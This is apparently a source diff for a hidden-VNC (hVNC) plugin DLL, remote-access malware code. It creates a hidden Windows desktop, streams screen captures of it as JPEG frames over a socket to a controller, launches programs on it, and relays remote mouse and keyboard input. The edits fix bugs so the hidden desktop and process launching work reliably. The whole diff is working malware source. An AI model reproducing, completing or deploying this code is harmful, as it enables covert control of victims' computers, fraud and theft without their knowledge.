@@ -73,20 +73,8 @@ static condition_variable g_inputCV;
 static thread g_inputThread;
 static atomic_bool g_inputRunning(false);
 
-static bool safe_send_raw(SOCKET sock, const vector<unsigned char>& data) {
-    if (sock == INVALID_SOCKET) return false;
-    const char* ptr = (const char*)data.data();
-    int remaining = (int)data.size();
-    while (remaining > 0) {
-        int sent = send(sock, ptr, remaining, 0);
-        if (sent == SOCKET_ERROR || sent <= 0) return false;
-        ptr += sent;
-        remaining -= sent;
-    }
-    return true;
-}
-
 static bool safe_send_json(SOCKET sock, const json& data) {
+    if (sock == INVALID_SOCKET) return false;
     lock_guard<mutex> lock(g_sendMutex);
     string serialized = data.dump() + "\r\n";
     const char* ptr = serialized.c_str();
@@ -98,6 +86,22 @@ static bool safe_send_json(SOCKET sock, const json& data) {
         remaining -= sent;
     }
     return true;
+}
+
+static void send_status(const string& msg) {
+    if (g_socket == INVALID_SOCKET) return;
+    json status;
+    status["action"] = "hvnc_status";
+    status["message"] = msg;
+    safe_send_json(g_socket, status);
+}
+
+static void send_error(const string& msg) {
+    if (g_socket == INVALID_SOCKET) return;
+    json err;
+    err["action"] = "hvnc_error";
+    err["message"] = msg;
+    safe_send_json(g_socket, err);
 }
 
 static bool safe_send_hvnc_frame(SOCKET sock, int scale, int fps, int width, int height, const vector<unsigned char>& jpegBytes) {
@@ -191,22 +195,6 @@ static bool bitmap_to_jpeg(HBITMAP hBmp, ULONG quality, vector<unsigned char>& b
     return true;
 }
 
-static void send_status(const string& msg) {
-    if (g_socket == INVALID_SOCKET) return;
-    json status;
-    status["action"] = "hvnc_status";
-    status["message"] = msg;
-    safe_send_json(g_socket, status);
-}
-
-static void send_error(const string& msg) {
-    if (g_socket == INVALID_SOCKET) return;
-    json err;
-    err["action"] = "hvnc_error";
-    err["message"] = msg;
-    safe_send_json(g_socket, err);
-}
-
 static void ensure_desktop() {
     if (g_hHiddenDesktop) return;
     g_hHiddenDesktop = OpenDesktopW(g_desktopName.c_str(), 0, FALSE, GENERIC_ALL);
@@ -214,9 +202,7 @@ static void ensure_desktop() {
         g_hHiddenDesktop = CreateDesktopW(g_desktopName.c_str(), NULL, NULL, 0, GENERIC_ALL, NULL);
     }
     if (!g_hHiddenDesktop) {
-        send_error("Failed to create hidden desktop");
-    } else {
-        send_status("Hidden desktop ready");
+        send_error("Failed to create/open hidden desktop");
     }
 }
 
@@ -228,12 +214,12 @@ static void capture_loop() {
     }
 
     if (!SetThreadDesktop(g_hHiddenDesktop)) {
-        send_error("Failed to attach capture thread to desktop");
+        send_error("Failed to attach capture thread to hidden desktop");
         g_captureRunning = false;
         return;
     }
 
-    send_status("Capture started");
+    send_status("Capture started on hidden desktop");
     while (g_captureRunning) {
         DWORD start = GetTickCount();
         int scale, fps;
@@ -252,22 +238,24 @@ static void capture_loop() {
         if (dw < 1) dw = 1; if (dh < 1) dh = 1;
 
         HDC hdc = GetDC(NULL);
-        HDC mdc = CreateCompatibleDC(hdc);
-        HBITMAP bmp = CreateCompatibleBitmap(hdc, dw, dh);
-        HGDIOBJ old = SelectObject(mdc, bmp);
-        SetStretchBltMode(mdc, HALFTONE);
-        StretchBlt(mdc, 0, 0, dw, dh, hdc, 0, 0, sw, sh, SRCCOPY);
-        SelectObject(mdc, old);
+        if (hdc) {
+            HDC mdc = CreateCompatibleDC(hdc);
+            HBITMAP bmp = CreateCompatibleBitmap(hdc, dw, dh);
+            HGDIOBJ old = SelectObject(mdc, bmp);
+            SetStretchBltMode(mdc, HALFTONE);
+            StretchBlt(mdc, 0, 0, dw, dh, hdc, 0, 0, sw, sh, SRCCOPY | CAPTUREBLT);
+            SelectObject(mdc, old);
 
-        vector<unsigned char> jpeg;
-        if (bitmap_to_jpeg(bmp, 50, jpeg)) {
-            if (!safe_send_hvnc_frame(s, scale, fps, dw, dh, jpeg)) {
-                g_captureRunning = false;
+            vector<unsigned char> jpeg;
+            if (bitmap_to_jpeg(bmp, 50, jpeg)) {
+                if (!safe_send_hvnc_frame(s, scale, fps, dw, dh, jpeg)) {
+                    g_captureRunning = false;
+                }
             }
+            DeleteObject(bmp);
+            DeleteDC(mdc);
+            ReleaseDC(NULL, hdc);
         }
-        DeleteObject(bmp);
-        DeleteDC(mdc);
-        ReleaseDC(NULL, hdc);
 
         DWORD elapsed = GetTickCount() - start;
         DWORD interval = 1000 / (fps > 0 ? fps : 1);
@@ -362,15 +350,18 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             vector<wchar_t> pathBuffer(wpath.begin(), wpath.end());
             pathBuffer.push_back(L'\0');
 
+            // Correct desktop string for CreateProcess: "WinSta0\DesktopName"
+            wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
+
             STARTUPINFOW si = { sizeof(si) };
-            si.lpDesktop = (LPWSTR)g_desktopName.c_str();
+            si.lpDesktop = (LPWSTR)fullDesktopName.c_str();
             PROCESS_INFORMATION pi = { 0 };
             if (CreateProcessW(NULL, pathBuffer.data(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                 CloseHandle(pi.hProcess);
                 CloseHandle(pi.hThread);
-                send_status("Process started on hidden desktop");
+                send_status("Process started on: " + string(fullDesktopName.begin(), fullDesktopName.end()));
             } else {
-                send_error("Failed to start process");
+                send_error("Failed to start process. Error: " + to_string(GetLastError()));
             }
         } else if (action.find("hvnc_mouse") != string::npos || action.find("hvnc_key") != string::npos) {
             lock_guard<mutex> lock(g_inputMutex);
